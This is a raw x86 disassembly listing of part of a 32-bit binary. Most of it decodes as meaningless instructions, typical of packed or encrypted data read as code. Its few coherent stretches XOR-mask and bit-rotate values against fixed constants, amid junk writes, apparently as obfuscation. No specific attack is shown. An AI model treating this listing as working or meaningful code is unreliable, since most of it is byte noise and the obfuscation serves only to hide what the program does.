  40a37f:	fnstsw WORD PTR [edi-0x6b]
  40a382:	add    BYTE PTR [edi],bl
  40a384:	jbe    0x40a3a3
  40a386:	fldcw  WORD PTR [ebx-0x6da34abe]
  40a38c:	jge    0x40a3d9
  40a38e:	mov    cl,0x6d
  40a390:	ret    0xb630
  40a393:	jg     0x40a339
  40a395:	test   eax,0x22881056
  40a39a:	push   eax
  40a39b:	mov    eax,ds:0xc4775461
  40a3a0:	sbb    al,0xbe
  40a3a2:	jae    0x40a385
  40a3a4:	dec    edi
  40a3a5:	aaa    
  40a3a6:	push   esi
  40a3a7:	ret    0x7bd1
  40a3aa:	sub    BYTE PTR [eax+0x49],ah
  40a3ad:	daa    
  40a3ae:	push   ecx
  40a3af:	add    DWORD PTR [edi],ebx
  40a3b1:	xor    dh,cl
  40a3b3:	cld    
  40a3b4:	adc    al,0x34
  40a3b6:	stos   DWORD PTR es:[edi],eax
  40a3b7:	(bad)  
  40a3b8:	retf   0xd5b
  40a3bb:	(bad)  
  40a3bc:	lock push esi
  40a3be:	add    eax,0x9741bf0d
  40a3c3:	in     eax,dx
  40a3c4:	or     edi,DWORD PTR [ecx+edx*8]
  40a3c7:	popa   
  40a3c8:	(bad)  
  40a3c9:	and    al,0x94
  40a3cb:	sahf   
  40a3cc:	pop    edi
  40a3cd:	outs   dx,DWORD PTR ds:[esi]
  40a3ce:	arpl   WORD PTR [esi-0x23],ax
  40a3d1:	test   eax,0x6f05a87a
  40a3d6:	xchg   edi,eax
  40a3d7:	xor    ecx,DWORD PTR [edx+0x5411bdaa]
  40a3dd:	std    
  40a3de:	push   0x71ec8dd2
  40a3e3:	cld    
  40a3e4:	in     al,0x71
  40a3e6:	inc    ebp
  40a3e7:	call   0xe3ed:0xc7379366
  40a3ee:	ss in  al,dx
  40a3f0:	fsub   QWORD PTR [eax]
  40a3f2:	add    ah,BYTE PTR [esi-0x6]
  40a3f5:	aam    0x66
  40a3f7:	sub    al,0xa6
  40a3f9:	in     eax,dx
  40a3fa:	test   BYTE PTR [ebx],dl
  40a3fc:	icebp  
  40a3fd:	sub    cl,BYTE PTR [edi-0x2187f877]
  40a403:	pop    edi
  40a404:	pop    eax
  40a405:	jle    0x40a392
  40a407:	adc    al,0xd0
  40a409:	adc    ebp,DWORD PTR [eax+0x1021e6e0]
  40a40f:	sub    BYTE PTR [ebx+0xbbae856],dh
  40a415:	dec    esp
  40a416:	adc    ch,BYTE PTR [eax-0x11]
  40a419:	out    dx,al
  40a41a:	stc    
  40a41b:	jo     0x40a428
  40a41d:	push   ecx
  40a41e:	(bad)  
  40a41f:	pop    ebp
  40a420:	push   0xea61caa7
  40a425:	ja     0x40a3c7
  40a427:	es dec eax
  40a429:	mov    DWORD PTR fs:[ebp-0x7fed01eb],ebx
  40a430:	sub    edi,DWORD PTR [ecx-0x5e]
  40a433:	adc    eax,0xce9b3a45
  40a438:	ins    BYTE PTR es:[edi],dx
  40a439:	lock dec ecx
  40a43b:	and    cl,BYTE PTR es:[edi-0x474cf717]
  40a442:	cmp    esp,DWORD PTR [ebp-0x17d1b21e]
  40a448:	sar    DWORD PTR [bx+si+0x32],cl
  40a44c:	ins    DWORD PTR es:[edi],dx
  40a44d:	or     eax,0xe4c909b1
  40a452:	push   ecx
  40a453:	mov    dl,0x92
  40a455:	es mov esi,0x827c7d22
  40a45b:	daa    
  40a45c:	sub    DWORD PTR [eax+0x70],esi
  40a45f:	imul   ebx,DWORD PTR [ecx+0x57],0x4b
  40a463:	jp     0x40a47f
  40a465:	dec    eax
  40a466:	fld    st(1)
  40a468:	pop    es
  40a469:	fcomp  QWORD PTR [eax-0x6b]
  40a46c:	xor    esp,DWORD PTR [esi]
  40a46e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a46f:	push   ebx
  40a470:	leave  
  40a471:	cs ss pop eax
  40a474:	test   eax,0xb6cde548
  40a479:	push   ebp
  40a47a:	add    BYTE PTR [ecx-0x26],0xe4
  40a47e:	in     al,0xe
  40a480:	dec    edx
  40a481:	bound  ebp,QWORD PTR [esi]
  40a483:	cwde   
  40a484:	popa   
  40a485:	arpl   dx,dx
  40a487:	mov    cl,0x85
  40a489:	or     BYTE PTR [edi-0x36],dh
  40a48c:	jg     0x40a481
  40a48e:	and    DWORD PTR [edi-0x35],ebx
  40a491:	dec    esp
  40a492:	mov    bl,BYTE PTR [ebp-0x76f6e09f]
  40a498:	es popa 
  40a49a:	stos   DWORD PTR es:[edi],eax
  40a49b:	xchg   esp,eax
  40a49c:	or     DWORD PTR [ecx+esi*4-0x5b],ecx
  40a4a0:	sbb    edx,0xfffffff6
  40a4a3:	sbb    DWORD PTR [ebp-0x34],0x3b
  40a4a7:	xchg   BYTE PTR [ecx+0x6e7e2786],dh
  40a4ad:	out    0x95,eax
  40a4af:	dec    edi
  40a4b0:	out    0x69,al
  40a4b2:	fdivr  st(5),st
  40a4b4:	xor    al,0x4a
  40a4b6:	sub    DWORD PTR [ebx+0xafb6abf],ecx
  40a4bc:	jl     0x40a492
  40a4be:	pop    ds
  40a4bf:	xchg   ecx,eax
  40a4c0:	leave  
  40a4c1:	adc    DWORD PTR [ecx-0x63],edx
  40a4c4:	mov    edi,0xcbe26a9
  40a4c9:	enter  0xfc6,0x53
  40a4cd:	jg     0x40a4a7
  40a4cf:	hlt    
  40a4d0:	sbb    ecx,edi
  40a4d2:	xchg   esi,eax
  40a4d3:	push   esp
  40a4d4:	data16 jp 0x40a4a3
  40a4d7:	test   BYTE PTR [esi-0x39],ch
  40a4da:	(bad)  [esi+eiz*4-0x1d]
  40a4de:	mov    dl,0x30
  40a4e0:	test   edx,0x6a18f169
  40a4e6:	pop    edi
  40a4e7:	pop    ebp
  40a4e8:	ficomp WORD PTR [ebx+0x4d]
  40a4eb:	push   edx
  40a4ec:	pop    ds
  40a4ed:	loopne 0x40a50f
  40a4ef:	jge    0x40a4bd
  40a4f1:	dec    esi
  40a4f2:	cdq    
  40a4f3:	(bad)  
  40a4f5:	call   0x416c20
  40a4fa:	mov    eax,DWORD PTR [esi]
  40a4fc:	mov    ecx,DWORD PTR [esi+0x4]
  40a4ff:	shrd   eax,ecx,0x2
  40a503:	shr    ecx,0x2
  40a506:	shr    edx,0x1e
  40a509:	xor    ecx,0xe706e27a
  40a50f:	push   ecx
  40a510:	xor    eax,edi
  40a512:	jmp    0x40a8f0
  40a517:	sbb    al,0x3d
  40a519:	jmp    0x40a4ee
  40a51b:	jmp    0x9189:0x511a1c23
  40a522:	jo     0x40a4ca
  40a524:	cdq    
  40a525:	lea    esi,[eax-0x28]
  40a528:	sub    ebx,DWORD PTR [eax]
  40a52a:	sbb    BYTE PTR [esi-0x78e7e7ee],bl
  40a530:	loopne 0x40a50d
  40a532:	sub    DWORD PTR cs:[edx-0x3edb490d],edi
  40a539:	call   0xd218a767
  40a53e:	mov    esp,0xe5215bf4
  40a543:	jp     0x40a4c8
  40a545:	out    0x57,al
  40a547:	jmp    0x5209:0x35c8fb7b
  40a54e:	xor    al,0x77
  40a550:	add    eax,0x4ff16cbf
  40a555:	and    al,0xb1
  40a557:	ins    DWORD PTR es:[edi],dx
  40a558:	(bad)  
  40a559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a55a:	mov    edx,0x9d0afadf
  40a55f:	dec    eax
  40a560:	cdq    
  40a561:	js     0x40a56c
  40a563:	mov    esp,0x608ee49d
  40a568:	or     bl,BYTE PTR es:[ebp-0x1dab3652]
  40a56f:	xchg   ebx,eax
  40a570:	jl     0x40a588
  40a572:	pop    ebx
  40a573:	loop   0x40a4f5
  40a575:	push   es
  40a576:	test   BYTE PTR [edi+0x2a],ah
  40a579:	fucom  st(5)
  40a57b:	lahf   
  40a57c:	cwde   
  40a57d:	xor    ch,BYTE PTR [edi+edi*1-0x1c]
  40a581:	adc    DWORD PTR [edx],0xffffff9b
  40a584:	add    DWORD PTR [ecx],0x6a
  40a587:	jl     0x40a536
  40a589:	jg     0x40a537
  40a58b:	hlt    
  40a58c:	test   eax,0xf46a9900
  40a591:	cdq    
  40a592:	hlt    
  40a593:	xchg   ebx,eax
  40a594:	cmp    bl,ch
  40a596:	into   
  40a597:	sub    DWORD PTR [ecx],esi
  40a599:	je     0x40a5d8
  40a59b:	shl    ch,0x90
  40a59e:	sti    
  40a59f:	mov    ch,0xc5
  40a5a1:	mov    ebp,0x1a992a8f
  40a5a6:	add    eax,0x3e690b5e
  40a5ab:	dec    edi
  40a5ac:	push   ss
  40a5ad:	cmc    
  40a5ae:	inc    esp
  40a5af:	out    dx,al
  40a5b0:	jmp    0x4fda:0xc20cee5e
  40a5b7:	shl    BYTE PTR [esi+0x7da90d40],0x15
  40a5be:	mov    ebp,0x9bec52a
  40a5c3:	mov    esi,0xe0a49955
  40a5c8:	pop    ecx
  40a5c9:	jp     0x40a63e
  40a5cb:	into   
  40a5cc:	loope  0x40a585
  40a5ce:	in     eax,dx
  40a5cf:	scas   eax,DWORD PTR es:[edi]
  40a5d0:	fs sub al,0x22
  40a5d3:	or     DWORD PTR [eax],0xfffffff2
  40a5d6:	xor    DWORD PTR [ebx-0x33],esi
  40a5d9:	adc    dl,BYTE PTR [edx]
  40a5db:	icebp  
  40a5dc:	cwde   
  40a5dd:	aas    
  40a5de:	ins    BYTE PTR es:[edi],dx
  40a5df:	dec    ecx
  40a5e0:	sbb    cl,al
  40a5e2:	sub    esi,DWORD PTR [ebx]
  40a5e4:	loope  0x40a640
  40a5e6:	xchg   ecx,eax
  40a5e7:	pop    ebp
  40a5e8:	xchg   DWORD PTR [edx],edi
  40a5ea:	pop    ebx
  40a5eb:	enter  0x8c5b,0xc6
  40a5ef:	mov    cl,0xdc
  40a5f1:	jmp    edi
  40a5f3:	cmp    BYTE PTR [ebx],dl
  40a5f5:	adc    eax,0x8e9d630
  40a5fa:	rol    BYTE PTR [ebp+0x6b],0xef
  40a5fe:	jbe    0x40a5f0
  40a600:	sub    DWORD PTR [ebp-0x35],ebx
  40a603:	repnz push eax
  40a605:	add    ebp,DWORD PTR [edi+0x5971077d]
  40a60b:	fild   WORD PTR [edx+0x1408139f]
  40a611:	arpl   WORD PTR [esp+esi*8],ax
  40a614:	rcr    DWORD PTR [ecx-0x73],1
  40a617:	jns    0x40a5ea
  40a619:	in     eax,0x9f
  40a61b:	popa   
  40a61c:	mov    bh,0x8c
  40a61e:	je     0x40a60e
  40a620:	loopne 0x40a696
  40a622:	adc    al,0x3d
  40a624:	xchg   ecx,eax
  40a625:	adc    al,0xa3
  40a627:	cli    
  40a628:	xor    al,0xe9
  40a62a:	xchg   edi,eax
  40a62b:	mov    ?,ebx
  40a62d:	(bad)  
  40a62e:	pop    esi
  40a62f:	pop    esi
  40a630:	xchg   edi,eax
  40a631:	xor    al,0xdf
  40a633:	xor    DWORD PTR [eax-0x62],eax
  40a636:	(bad)  
  40a637:	jl     0x40a68c
  40a639:	(bad)  
  40a63a:	fwait
  40a63b:	jle    0x40a640
  40a63d:	pop    es
  40a63e:	lds    ebx,FWORD PTR [eax-0x4fb9bc1f]
  40a644:	or     DWORD PTR [eax-0x6a16d150],edx
  40a64a:	cwde   
  40a64b:	dec    eax
  40a64c:	xchg   BYTE PTR [ebp+0x144be85],dh
  40a652:	add    eax,ecx
  40a654:	cmp    BYTE PTR [esi],ah
  40a656:	or     DWORD PTR [edi-0x68],0xffffffd0
  40a65a:	xor    al,BYTE PTR [ecx-0x7baafd72]
  40a660:	mov    eax,ds:0xb3564c25
  40a665:	inc    ebp
  40a667:	sub    eax,0x29fb8802
  40a66c:	xlat   BYTE PTR ds:[ebx]
  40a66d:	add    BYTE PTR [ebp+0x43a97dfc],al
  40a673:	sub    esp,DWORD PTR [ecx-0x2b]
  40a676:	xor    al,0x8b
  40a678:	aaa    
  40a679:	and    edx,esp
  40a67b:	jnp    0x40a634
  40a67d:	inc    edi
  40a67e:	pop    ds
  40a67f:	lahf   
  40a680:	retf   
  40a681:	fcmovnbe st,st(0)
  40a683:	push   es
  40a684:	sbb    bl,BYTE PTR [eax+ebx*2-0x297aaa93]
  40a68b:	jg     0x40a679
  40a68d:	add    ebx,DWORD PTR [ecx-0x38]
  40a690:	in     al,dx
  40a691:	ins    DWORD PTR es:[edi],dx
  40a692:	retf   
  40a693:	leave  
  40a694:	add    DWORD PTR [ecx+ecx*8],esp
  40a697:	js     0x40a6db
  40a699:	pushf  
  40a69a:	mov    ecx,0xb5272aa2
  40a69f:	xchg   ecx,eax
  40a6a0:	iret   
  40a6a1:	dec    ecx
  40a6a2:	jo     0x40a6f1
  40a6a4:	out    0xb,al
  40a6a6:	dec    eax
  40a6a7:	pushf  
  40a6a8:	nop
  40a6a9:	ds iret 
  40a6ab:	mov    ecx,0x8e47bd2f
  40a6b0:	push   ebp
  40a6b1:	or     edx,DWORD PTR ss:[esi+ebp*4]
  40a6b5:	xor    eax,ebx
  40a6b7:	add    eax,0xc0aab5f2
  40a6bc:	jo     0x40a652
  40a6be:	jbe    0x40a6fd
  40a6c0:	addr16 loope 0x40a6c6
  40a6c3:	call   0xba2:0xaf5b6640
  40a6ca:	sub    dl,BYTE PTR [esi]
  40a6cc:	aas    
  40a6cd:	dec    edx
  40a6ce:	sub    al,0x40
  40a6d0:	jo     0x40a65b
  40a6d2:	push   cs
  40a6d3:	pop    edi
  40a6d4:	inc    ebx
  40a6d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6d6:	adc    dh,cl
  40a6d8:	adc    bh,BYTE PTR [eax-0x22]
  40a6db:	in     eax,0x12
  40a6dd:	adc    al,dl
  40a6df:	repnz sbb dh,BYTE PTR [eax-0x2d728691]
  40a6e6:	in     al,dx
  40a6e7:	lahf   
  40a6e8:	out    dx,al
  40a6e9:	lock xchg edi,eax
  40a6eb:	jbe    0x40a6ea
  40a6ed:	test   al,0xe4
  40a6ef:	daa    
  40a6f0:	int    0x6
  40a6f2:	(bad)  
  40a6f3:	sar    DWORD PTR [ebx-0x47],1
  40a6f6:	xchg   esp,eax
  40a6f7:	dec    ebx
  40a6f8:	ds pop edi
  40a6fa:	pusha  
  40a6fb:	and    al,0x91
  40a6fd:	mov    ds:0xce8c0992,al
  40a702:	cmc    
  40a703:	leave  
  40a704:	rcl    esp,1
  40a706:	add    ch,BYTE PTR [ecx+esi*4+0x3fdbae9e]
  40a70d:	xor    eax,0x61148059
  40a712:	ret    0x4033
  40a715:	ja     0x40a6d9
  40a717:	jbe    0x40a75d
  40a719:	stc    
  40a71a:	adc    esi,DWORD PTR [ebx+0x379f8464]
  40a720:	xchg   ebx,eax
  40a721:	push   ecx
  40a722:	push   edx
  40a723:	mov    WORD PTR [edx+0x2798f171],ds
  40a729:	das    
  40a72a:	mov    eax,0x5df0811e
  40a72f:	fnstcw WORD PTR [ebx-0x12]
  40a732:	mov    ds:0xbcaaf3c1,al
  40a737:	cmp    BYTE PTR [ebx-0x61a72a5c],bl
  40a73d:	mov    BYTE PTR [ecx+ebx*1-0xe37086a],dh
  40a744:	adc    al,BYTE PTR [ebp+ecx*2-0x6a]
  40a748:	xor    BYTE PTR [ebx],bh
  40a74a:	test   DWORD PTR [edx+0x3e],ecx
  40a74d:	nop
  40a74e:	rcr    DWORD PTR [ecx+0x116d7849],0x83
  40a755:	das    
  40a756:	and    ebp,DWORD PTR [ebp-0x1a4e7ad]
  40a75c:	clc    
  40a75d:	mov    ds:0xfc537673,eax
  40a762:	mov    eax,ds:0xebaea7b2
  40a767:	push   cs
  40a768:	jmp    0xd473:0x35e7ce65
  40a76f:	xchg   BYTE PTR [eax],al
  40a771:	mov    esi,0xf18cacde
  40a776:	xchg   BYTE PTR cs:[edi+eiz*4-0x55],bh
  40a77b:	mov    eax,0xb24e7d31
  40a780:	mov    eax,0x2c712296
  40a785:	add    DWORD PTR [edx-0x39591fea],eax
  40a78b:	call   0xe2cd:0x332da8e9
  40a792:	cmc    
  40a793:	test   DWORD PTR [edx],esp
  40a795:	dec    DWORD PTR [edx-0x1d]
  40a798:	sti    
  40a799:	sahf   
  40a79a:	sbb    eax,0xd6dc915f
  40a79f:	cmp    BYTE PTR [ebp+0xb],cl
  40a7a2:	adc    ch,ch
  40a7a4:	ins    BYTE PTR es:[edi],dx
  40a7a5:	sub    eax,0xfbc01c10
  40a7aa:	mov    dh,BYTE PTR [eax+0x69cdeb70]
  40a7b0:	mov    ebx,0xea6c225d
  40a7b5:	dec    eax
  40a7b6:	out    dx,eax
  40a7b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7b8:	ja     0x40a807
  40a7ba:	xor    al,0xde
  40a7bc:	js     0x40a74a
  40a7be:	nop
  40a7bf:	sbb    edx,ecx
  40a7c1:	lods   al,BYTE PTR ds:[esi]
  40a7c2:	lds    edx,FWORD PTR [esi]
  40a7c4:	je     0x40a7d9
  40a7c6:	in     eax,dx
  40a7c7:	jbe    0x40a750
  40a7c9:	cmp    bh,ch
  40a7cb:	repz cwde 
  40a7cd:	push   ss
  40a7ce:	jecxz  0x40a7a6
  40a7d0:	outs   dx,DWORD PTR ds:[esi]
  40a7d1:	and    DWORD PTR [eax+0x49],esp
  40a7d4:	xchg   esi,eax
  40a7d5:	push   cs
  40a7d6:	sub    ch,BYTE PTR [esi-0x74909b63]
  40a7dc:	ins    BYTE PTR es:[edi],dx
  40a7dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7de:	leave  
  40a7df:	ins    DWORD PTR es:[edi],dx
  40a7e0:	mov    edx,0x920db6a3
  40a7e5:	retf   0x4a7f
  40a7e8:	adc    BYTE PTR [eax+esi*8-0x92db66e],0xa9
  40a7f0:	jmp    0x40a7a0
  40a7f2:	lock cdq 
  40a7f4:	mov    ds,edi
  40a7f6:	test   ah,ch
  40a7f8:	and    BYTE PTR [edi-0x27d20cb1],bh
  40a7fe:	or     BYTE PTR [ebx-0x7ffa194f],dh
  40a804:	sbb    al,0x2b
  40a806:	mov    edi,DWORD PTR [eax]
  40a808:	adc    al,0xb1
  40a80a:	sub    BYTE PTR [edi+0xa],ah
  40a80d:	xor    esp,eax
  40a80f:	or     ebp,DWORD PTR [ebx+esi*2+0x510d8915]
  40a816:	iret   
  40a817:	rcr    BYTE PTR [ebx+0x55],1
  40a81a:	adc    BYTE PTR [esi-0x374e5b99],0x36
  40a821:	push   ebx
  40a822:	mov    cl,BYTE PTR [esi]
  40a824:	dec    ebx
  40a825:	sub    al,0x8f
  40a827:	sub    al,0x61
  40a829:	xor    BYTE PTR [ebx-0x3ad613c6],ah
  40a82f:	jo     0x40a820
  40a831:	xor    al,0xfe
  40a833:	xchg   edi,eax
  40a834:	out    0x9a,al
  40a836:	xor    DWORD PTR [esi+0x1d],0xffffffb2
  40a83a:	or     edx,esp
  40a83c:	hlt    
  40a83d:	data16 test dl,cl
  40a840:	fist   WORD PTR [ebp-0x12349fce]
  40a846:	out    dx,al
  40a847:	xor    cl,dl
  40a849:	mov    eax,ds:0x814b8c6e
  40a84e:	push   edi
  40a84f:	xchg   bl,bl
  40a851:	sbb    bh,0x9e
  40a854:	bound  esp,QWORD PTR ds:[ecx-0x9a8af44]
  40a85b:	ret    0x99d7
  40a85e:	or     DWORD PTR [eax+0x6d],edx
  40a861:	and    eax,ebx
  40a863:	mov    edi,ebx
  40a865:	iret   
  40a866:	jecxz  0x40a885
  40a868:	ret    
  40a869:	push   ds
  40a86a:	adc    al,0x34
  40a86c:	aaa    
  40a86d:	dec    ebx
  40a86e:	(bad)  
  40a86f:	mov    ebx,0xfd615332
  40a874:	inc    edx
  40a875:	and    ebx,DWORD PTR [ecx-0x3e]
  40a878:	add    dl,0x87
  40a87b:	sub    eax,0x5f21e239
  40a880:	mov    eax,0xacb4c30c
  40a885:	sub    al,0xfe
  40a887:	add    BYTE PTR [ebx],cl
  40a889:	aaa    
  40a88a:	push   ds
  40a88b:	fs ins BYTE PTR es:[edi],dx
  40a88d:	pop    esi
  40a88e:	aas    
  40a88f:	ret    0x484d
  40a892:	ss inc edi
  40a894:	sub    ah,ah
  40a896:	rcl    BYTE PTR [eax+edi*2],cl
  40a899:	mov    esi,0x935e9670
  40a89e:	rcl    DWORD PTR gs:[ebx+esi*4],1
  40a8a2:	mov    ecx,eax
  40a8a4:	gs nop
  40a8a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8a7:	(bad)  
  40a8a8:	jb     0x40a8fc
  40a8aa:	mov    dl,0xd8
  40a8ac:	iret   
  40a8ad:	cmp    BYTE PTR [ebx],ch
  40a8af:	aaa    
  40a8b0:	push   edx
  40a8b1:	jl     0x40a848
  40a8b3:	stos   DWORD PTR es:[edi],eax
  40a8b4:	sahf   
  40a8b5:	popf   
  40a8b6:	add    BYTE PTR gs:[esp+eax*4+0x63],0x73
  40a8bc:	test   DWORD PTR [edi],esp
  40a8be:	sub    BYTE PTR [edx+ecx*8+0x151bc5f4],ah
  40a8c5:	arpl   sp,di
  40a8c7:	xchg   esp,eax
  40a8c8:	mov    eax,ds:0x55201240
  40a8cd:	mov    edi,0x1ba60648
  40a8d2:	imul   ecx,DWORD PTR [ecx],0xb92dcb53
  40a8d8:	cmp    esi,DWORD PTR [edi+esi*8]
  40a8db:	cmp    BYTE PTR [esi+0xa],al
  40a8de:	mov    bh,0x40
  40a8e0:	mov    dh,0x14
  40a8e2:	test   DWORD PTR ds:0x2f6744f7,ebp
  40a8e8:	outs   dx,BYTE PTR ds:[esi]
  40a8e9:	adc    DWORD PTR [ecx-0x3c],esp
  40a8ec:	sbb    ebp,0x5589142c
  40a8f2:	adc    BYTE PTR [ebx+0x47b8b13],cl
  40a8f8:	push   eax
  40a8f9:	push   edi
  40a8fa:	push   edx
  40a8fb:	call   0x416c20
  40a900:	shld   edx,eax,0x2
  40a904:	shl    eax,0x2
  40a907:	mov    ecx,eax
  40a909:	or     ecx,DWORD PTR [ebp+0x10]
  40a90c:	xor    eax,eax
  40a90e:	or     edx,eax
  40a910:	xor    ecx,0xca79a575
  40a916:	xor    edx,0x9c1b89e8
  40a91c:	mov    DWORD PTR [esi],ecx
  40a91e:	mov    DWORD PTR [esi+0x4],edx
  40a921:	mov    eax,0x40000000
  40a926:	mov    edx,DWORD PTR [ebx]
  40a928:	mov    ecx,DWORD PTR [ebx+0x4]
  40a92b:	xor    edx,0xca79a577
  40a931:	xor    ecx,0x9c1b89e8
  40a937:	shrd   edx,ecx,0x2
  40a93b:	shr    ecx,0x2
  40a93e:	mov    DWORD PTR [ebp-0x6c],ecx
  40a941:	mov    ecx,DWORD PTR [ebx]
  40a943:	mov    edi,DWORD PTR [ebx+0x4]
  40a946:	mov    edi,ecx
  40a948:	xor    ecx,ecx
  40a94a:	or     ecx,edx
  40a94c:	mov    DWORD PTR [ebp+0x8],ecx
  40a94f:	mov    ecx,DWORD PTR [esi]
  40a951:	mov    edx,DWORD PTR [esi+0x4]
  40a954:	xor    edx,0x9c1b89e8
  40a95a:	xor    ecx,0xca79a577
  40a960:	shl    edi,0x1e
  40a963:	mov    DWORD PTR [ebp+0x14],ecx
  40a966:	mov    ecx,edx
  40a968:	mov    edx,DWORD PTR [ebp+0x14]
  40a96b:	shrd   edx,ecx,0x2
  40a96f:	xor    edi,eax
  40a971:	or     edi,DWORD PTR [ebp-0x6c]
  40a974:	mov    DWORD PTR [ebp-0x70],edx
  40a977:	mov    edx,DWORD PTR [esi]
  40a979:	mov    DWORD PTR [ebp+0xc],edi
  40a97c:	mov    edi,DWORD PTR [esi+0x4]
  40a97f:	shl    edx,0x1e
  40a982:	xor    edi,edi
  40a984:	or     edi,DWORD PTR [ebp-0x70]
  40a987:	shr    ecx,0x2
  40a98a:	xor    edx,eax
  40a98c:	or     edx,ecx
  40a98e:	cmp    edi,DWORD PTR [ebp+0x8]
  40a991:	jne    0x40a9a0
  40a997:	cmp    edx,DWORD PTR [ebp+0xc]
  40a99a:	je     0x40a9b0
  40a9a0:	push   DWORD PTR [ebp+0x20]
  40a9a3:	push   DWORD PTR [ebp+0x1c]
  40a9a6:	push   DWORD PTR [ebp+0x18]
  40a9a9:	push   ebx
  40a9aa:	push   esi
  40a9ab:	call   0x414dd5
  40a9b0:	pop    edi
  40a9b1:	leave  
  40a9b2:	ret    0x1c
  40a9b5:	cmp    cl,0x40
  40a9b8:	mov    DWORD PTR ds:0x4282e3,0x3afd
  40a9c2:	jae    0x40aa0b
  40a9c8:	mov    DWORD PTR ds:0x4282d7,0x7b96
  40a9d2:	cmp    cl,0x20
  40a9d5:	mov    DWORD PTR ds:0x428233,0x3ad8
  40a9df:	jae    0x40a9fb
  40a9e5:	mov    DWORD PTR ds:0x4282db,0x760a
  40a9ef:	shrd   eax,edx,cl
  40a9f2:	not    DWORD PTR ds:0x428263
  40a9f8:	shr    edx,cl
  40a9fa:	ret    
  40a9fb:	add    DWORD PTR ds:0x428257,ecx
  40aa01:	mov    eax,edx
  40aa03:	xor    edx,edx
  40aa05:	and    cl,0x1f
  40aa08:	shr    eax,cl
  40aa0a:	ret    
  40aa0b:	xor    eax,eax
  40aa0d:	xor    edx,edx
  40aa0f:	ret    
  40aa10:	push   ebp
  40aa11:	mov    ebp,esp
  40aa13:	sub    esp,0x30
  40aa16:	mov    DWORD PTR [ebp-0x18],0xca79a575
  40aa1d:	xor    ecx,ecx
  40aa1f:	mov    eax,0x9c1b89e8
  40aa24:	mov    DWORD PTR [ebp-0x14],eax
  40aa27:	not    ecx
  40aa29:	mov    DWORD PTR [ebp-0x30],0xca79a571
  40aa30:	dec    DWORD PTR ds:0x4282d3
  40aa36:	mov    DWORD PTR [ebp-0x2c],eax
  40aa39:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  40aa40:	mov    ecx,DWORD PTR ds:0x42820b
  40aa46:	sbb    DWORD PTR ds:0x42814b,ecx
  40aa4c:	mov    DWORD PTR [ebp-0x24],0x29bd2
  40aa53:	jmp    0x40ae49
  40aa58:	clc    
  40aa59:	sub    dh,BYTE PTR [edx+0x306b2a6b]
  40aa5f:	sub    bh,BYTE PTR ds:0x4a7e1f6a
  40aa65:	cmc    
  40aa66:	daa    
  40aa67:	stos   BYTE PTR es:[edi],al
  40aa68:	pop    edi
  40aa69:	and    ebx,DWORD PTR [eax]
  40aa6b:	sbb    BYTE PTR [esi+0x12],ch
  40aa6e:	sbb    BYTE PTR [eax],bl
  40aa70:	mov    ecx,0x5a27586e
  40aa75:	push   ebp
  40aa76:	and    al,BYTE PTR ds:0xee2f4c17
  40aa7c:	jo     0x40aabe
  40aa7e:	dec    eax
  40aa7f:	jmp    0xf5b1:0x87526b77
  40aa86:	nop
  40aa87:	pop    ss
  40aa88:	sub    ebx,DWORD PTR [ebp+0x757de8a1]
  40aa8e:	stos   WORD PTR es:[di],ax
  40aa91:	push   ds
  40aa92:	mov    dh,0x55
  40aa94:	je     0x40aae0
  40aa96:	(bad)  
  40aa97:	sub    eax,0xc5eb96ba
  40aa9c:	dec    ebx
  40aa9d:	mov    al,0x7e
  40aa9f:	inc    ebx
  40aaa0:	add    al,0xf5
  40aaa2:	add    ecx,edi
  40aaa4:	in     al,dx
  40aaa5:	aaa    
  40aaa6:	mov    dh,0x8d
  40aaa8:	jno    0x40ab11
  40aaaa:	lahf   
  40aaab:	mov    eax,0x9c1c67c6
  40aab0:	cld    
  40aab1:	jns    0x40ab22
  40aab3:	inc    esi
  40aab4:	add    esi,DWORD PTR [ebx]
  40aab6:	xor    edx,DWORD PTR [edx-0x5cf3a7c3]
  40aabc:	jne    0x40ab22
  40aabe:	test   DWORD PTR [edi+0x7f19857a],eax
  40aac4:	(bad)  
  40aac5:	icebp  
  40aac6:	scas   al,BYTE PTR es:[edi]
  40aac7:	mov    dh,0xaf
  40aac9:	push   eax
  40aacb:	xor    DWORD PTR ds:0x1a45a3c,edx
  40aad1:	fiadd  WORD PTR [edi-0x36e68a1b]
  40aad7:	ds mov al,0x2c
  40aada:	(bad)  
  40aadb:	stos   DWORD PTR es:[edi],eax
  40aadc:	gs pushf 
  40aade:	bt     ecx,eax
  40aae1:	xchg   BYTE PTR [esi+0xfa1a386],cl
  40aae7:	jmp    0x40ab44
  40aae9:	js     0x40aa72
  40aaeb:	xor    BYTE PTR [edi+0x1066d4f7],0xb1
  40aaf2:	pop    esi
  40aaf3:	lods   eax,DWORD PTR ds:[esi]
  40aaf4:	add    BYTE PTR [eax+edx*1-0x6],al
  40aaf8:	addr16 sbb edi,esi
  40aafb:	sub    al,0xab
  40aafd:	jne    0x40ab6e
  40aaff:	mov    dl,0x33
  40ab01:	in     al,0x38
  40ab03:	xchg   edi,eax
  40ab04:	fmul   DWORD PTR [ebp+0x6c0e993a]
  40ab0a:	sub    eax,0x69ab03dc
  40ab0f:	xor    al,0xd
  40ab11:	pop    ds
  40ab12:	mov    gs,WORD PTR [ebx+0x48]
  40ab15:	mov    al,ds:0x46239477
  40ab1a:	cmp    al,0x59
  40ab1c:	inc    ebx
  40ab1d:	pop    esp
  40ab1e:	add    DWORD PTR [ebx],0x53
  40ab21:	je     0x40ab3c
  40ab23:	add    DWORD PTR [ecx-0x24ce741b],edx
  40ab29:	popa   
  40ab2a:	xchg   edi,eax
  40ab2b:	mov    dh,0xa8
  40ab2d:	xchg   esp,eax
  40ab2e:	test   eax,0x8be1318c
  40ab33:	lds    ebp,FWORD PTR [edx]
  40ab35:	movs   WORD PTR es:[edi],WORD PTR fs:[esi]
  40ab38:	js     0x40ab5c
  40ab3a:	jbe    0x40ab42
  40ab3c:	jbe    0x40ab62
  40ab3e:	sbb    DWORD PTR [ebp+eax*4-0x5e],ebx
  40ab42:	fstp   TBYTE PTR [edi+0x2a]
  40ab45:	or     al,0x40
  40ab47:	mov    BYTE PTR [ebx+0x8],ch
